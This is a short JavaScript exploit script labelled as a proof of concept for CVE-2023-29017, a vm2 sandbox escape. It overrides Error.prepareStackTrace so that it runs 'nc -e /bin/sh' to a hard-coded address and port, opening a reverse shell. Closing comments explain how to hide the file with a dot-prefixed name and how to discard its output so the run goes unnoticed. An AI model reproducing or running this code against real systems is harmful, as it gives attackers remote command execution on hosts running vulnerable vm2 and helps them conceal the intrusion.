// PoC for CVE-2023-29017 with reverse shell

const {VM} = require('vm2');
const sandbox = new VM({
    timeout: 1000,
    sandbox: {}
});
sandbox.run(`
    const { exec } = require('child_process');
    Error.prepareStackTrace = function (err, stack) {
        exec('nc -e /bin/sh 192.168.1.10 4444'); // change IP and port as needed
        return stack;
    };
    async function foo() {
        await Promise.reject();
    }
    foo();
`);

// Save this code as poc.js and hide it by adding a dot at the start of its name
// mv poc.js .poc.js

// Hide the output of the code by using >/dev/null 2>&1
// node .poc.js >/dev/null 2>&1
